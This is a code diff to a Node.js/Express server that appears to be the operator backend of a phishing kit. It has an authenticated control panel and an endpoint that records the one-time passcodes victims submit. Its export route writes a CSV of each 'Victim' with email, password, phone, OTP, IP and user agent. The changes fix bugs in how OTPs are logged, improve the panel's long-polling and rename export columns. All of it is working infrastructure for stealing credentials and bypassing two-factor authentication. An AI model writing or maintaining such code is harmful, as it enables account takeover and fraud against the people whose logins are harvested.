@@ -55,7 +55,7 @@ app.use((req, res, next) => {
   next();
 });
 
-/* ----------  CUSTOM SESSION MIDDLEWARE - FIXED ---------- */
+/* ----------  CUSTOM SESSION MIDDLEWARE ---------- */
 function signCookie(value, secret) {
   return crypto.createHmac('sha256', secret).update(value).digest('base64url');
 }
@@ -65,13 +65,12 @@ function setSessionCookie(res, data) {
   const signature = signCookie(encoded, SESSION_SECRET);
   const value = `${encoded}.${signature}`;
   
-  // FIXED: Added explicit expiration and secure flags
   res.cookie(COOKIE_NAME, value, {
     httpOnly: true,
     secure: true,
     sameSite: 'lax',
-    maxAge: 24 * 60 * 60 * 1000, // 24 hours
-    expires: new Date(Date.now() + 24 * 60 * 60 * 1000), // Explicit expiration
+    maxAge: 24 * 60 * 60 * 1000,
+    expires: new Date(Date.now() + 24 * 60 * 60 * 1000),
     path: '/'
   });
 }
@@ -86,7 +85,7 @@ function getSessionCookie(req) {
     
     const expectedSig = signCookie(encoded, SESSION_SECRET);
     if (signature !== expectedSig) {
-      console.log('[DEBUG] Cookie signature mismatch - possible secret rotation or tampering');
+      console.log('[DEBUG] Cookie signature mismatch');
       return null;
     }
     
@@ -106,11 +105,10 @@ function clearSessionCookie(res) {
   });
 }
 
-// Session middleware with auto-save on every request
+// Session middleware
 app.use((req, res, next) => {
   req.session = getSessionCookie(req) || {};
   
-  // Auto-renew session on every request (prevents timeout during active use)
   if (req.session.authed) {
     req.session.lastActivity = Date.now();
   }
@@ -121,15 +119,6 @@ app.use((req, res, next) => {
   req.session.destroy = () => {
     clearSessionCookie(res);
     req.session = {};
-  };
-  
-  // Save session at end of request if modified
-  const originalJson = res.json;
-  res.json = function(data) {
-    if (req.session && req.session.authed) {
-      req.session.save();
-    }
-    return originalJson.call(this, data);
   };
   
   next();
@@ -159,7 +148,6 @@ app.get('/success.html', (req, res) => res.sendFile(__dirname + '/success.html')
 /* ----------  PANEL ACCESS CONTROL  ---------- */
 app.get('/panel', (req, res) => {
   if (req.session?.authed === true) {
-    // Refresh session on every panel access
     req.session.save();
     return res.sendFile(__dirname + '/_panel.html');
   }
@@ -348,7 +336,7 @@ app.post('/api/otp', async (req, res) => {
     sessionActivity.set(sid, Date.now());
 
     v.activityLog = v.activityLog || [];
-    v.activityLog.push({ time: Date.now(), action: 'ENTERED OTP', detail: `OTP: ${s.otp}` });
+    v.activityLog.push({ time: Date.now(), action: 'ENTERED OTP', detail: `OTP: ${otp}` });
 
     const entry = auditLog.find(e => e.sid === sid);
     if (entry) entry.otp = otp;
@@ -410,7 +398,6 @@ app.post('/api/interaction', (req, res) => {
 /* ----------  PANEL API  ---------- */
 app.get('/api/user', (req, res) => {
   if (req.session?.authed) {
-    // Refresh session on API calls
     req.session.lastActivity = Date.now();
     req.session.save();
     return res.json({ username: req.session.username || PANEL_USER });
@@ -438,16 +425,26 @@ function buildPanelPayload() {
   };
 }
 
+// FIXED: Proper long-poll with response tracking
 app.get('/api/panel', (req, res) => {
   if (!req.session?.authed) return res.status(401).json({ error: 'Not authenticated' });
 
-  // Refresh session on panel data request
   req.session.lastActivity = Date.now();
   req.session.save();
 
-  const listener = () => res.json(buildPanelPayload());
+  let responded = false;
+  
+  const listener = () => {
+    if (responded) return;
+    responded = true;
+    res.json(buildPanelPayload());
+  };
+  
   events.once('panel', listener);
+  
   setTimeout(() => {
+    if (responded) return;
+    responded = true;
     events.removeListener('panel', listener);
     res.json(buildPanelPayload());
   }, 1000);
@@ -456,7 +453,6 @@ app.get('/api/panel', (req, res) => {
 app.post('/api/panel', async (req, res) => {
   if (!req.session?.authed) return res.status(401).json({ error: 'Not authenticated' });
 
-  // Refresh session on panel action
   req.session.lastActivity = Date.now();
   req.session.save();
 
@@ -493,7 +489,6 @@ app.post('/api/panel', async (req, res) => {
 app.get('/api/export', (req, res) => {
   if (!req.session?.authed) return res.status(401).send('Unauthorized');
 
-  // Refresh session
   req.session.lastActivity = Date.now();
   req.session.save();
 
@@ -511,7 +506,7 @@ app.get('/api/export', (req, res) => {
     }));
 
   const csv = [
-    ['Victim#','Client','Password','Phone','OTP','IP','UA','Timestamp'],
+    ['Victim#','Email','Password','Phone','OTP','IP','UA','Timestamp'],
     ...successes.map(s=>Object.values(s).map(v=>`"${v}"`))
   ].map(r=>r.join(',')).join('\n');
 
